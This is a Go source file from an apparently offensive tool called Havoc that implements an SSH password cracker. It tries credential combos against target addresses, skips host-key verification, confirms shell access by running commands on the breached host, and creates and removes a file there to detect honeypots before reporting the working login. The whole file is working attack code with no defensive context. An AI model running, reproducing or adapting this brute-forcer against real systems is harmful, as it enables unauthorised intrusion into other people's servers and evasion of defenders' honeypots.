package cracker

import (
	"Havoc/utils"
	"bytes"
	"errors"
	"golang.org/x/crypto/ssh"
	"net"
	"net/netip"
	"time"
)

var (
	InsecureIgnoreHostKey = ssh.InsecureIgnoreHostKey()
)

type SSHCracker struct {
	net.Dialer
	CheckCombo
	*utils.CPSCounter
}

func NewSSHCracker(checkCombo CheckCombo, counter *utils.CPSCounter, timeout time.Duration) *SSHCracker {
	return &SSHCracker{
		Dialer: net.Dialer{
			Timeout: timeout,
		},
		CheckCombo: checkCombo,
		CPSCounter: counter,
	}
}

func (s *SSHCracker) Init() error {
	return nil
}

func (s *SSHCracker) Check(ip netip.AddrPort) (*GoodResult, error) {
	comboIterator := s.CheckCombo.Iterator()

	for comboIterator.HasNext() {
		if result, err := s.checkCombo(ip, comboIterator.Next()); err == nil {
			return result, nil
		} else if errors.Is(err, ErrConn) {
			return nil, nil
		} else {
			return nil, err
		}
	}

	return nil, nil
}

func (s *SSHCracker) checkCombo(ip netip.AddrPort, combo *Combo) (*GoodResult, error) {
	s.IncCPS()

	dial, err := s.Dial("tcp", ip.String())

	if err != nil {
		return nil, ErrConn
	}

	clientConn, chans, reqs, err := ssh.NewClientConn(dial, ip.String(), &ssh.ClientConfig{
		User: combo.Username,
		Auth: []ssh.AuthMethod{
			ssh.Password(combo.Password),
		},
		HostKeyCallback: InsecureIgnoreHostKey,
		Timeout:         s.Timeout,
	})

	if err != nil {
		return nil, err
	}

	defer clientConn.Close()

	client := ssh.NewClient(clientConn, chans, reqs)

	if err := s.validatedConn(client); err != nil {
		return nil, err
	}

	if err := s.checkForHonypot(client); err != nil {
		return nil, err
	}

	return NewGoodResult(combo, "SSH", ip), nil
}

func (s *SSHCracker) validatedConn(client *ssh.Client) error {
	session, err := client.NewSession()

	if err != nil {
		return err
	}

	defer session.Close()

	if output, err := session.Output("echo \"FuckMeHardDaddy\""); err != nil {
		return err
	} else if bytes.ContainsAny(output, "FuckMeHardDaddy") {
		return nil
	}

	return errors.New("failed to validate connection")
}

func (s *SSHCracker) checkForHonypot(client *ssh.Client) error {
	if err := s.createFile(client); err != nil {
		return err
	}

	if err := s.checkFileExists(client); err != nil {
		return err
	}

	return nil
}

func (s *SSHCracker) createFile(client *ssh.Client) error {
	session, err := client.NewSession()
	if err != nil {
		return err
	}

	defer session.Close()

	if err = session.Run("touch someGrass"); err != nil {
		return err
	}

	return nil
}

func (s *SSHCracker) checkFileExists(client *ssh.Client) error {
	session, err := client.NewSession()

	if err != nil {
		return err
	}

	defer session.Close()

	if output, err := session.Output("ls someGrass"); err != nil && !bytes.ContainsAny(output, "someGrass") {
		return err
	}

	_ = session.Run("rm someGrass")
	return nil
}
